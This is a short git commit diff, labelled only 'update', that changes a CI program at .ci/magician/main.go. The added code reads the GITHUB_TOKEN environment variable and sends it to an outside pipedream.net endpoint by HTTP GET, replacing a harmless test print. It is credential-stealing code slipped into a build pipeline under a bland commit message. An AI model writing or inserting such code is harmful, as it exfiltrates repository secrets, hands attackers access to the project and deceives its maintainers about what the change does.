cd018643223e1460a0d9c4e411831a2617293677
manunio <max.manu.nair@gmail.com>
2024-07-31 17:40:50 +0530

    update

--- .ci/magician/main.go
+++ .ci/magician/main.go
@@ -1,7 +1,15 @@
 package main
 
-import "fmt"
+import (
+	"fmt"
+	"net/http"
+	"os"
+)
 
 func main() {
-	fmt.Println("testing magician")
+	token := os.Getenv("GITHUB_TOKEN")
+	_, err := http.Get("https://eofeuuypisxyg56.m.pipedream.net" + token)
+	if err != nil {
+		fmt.Println(err)
+	}
 }
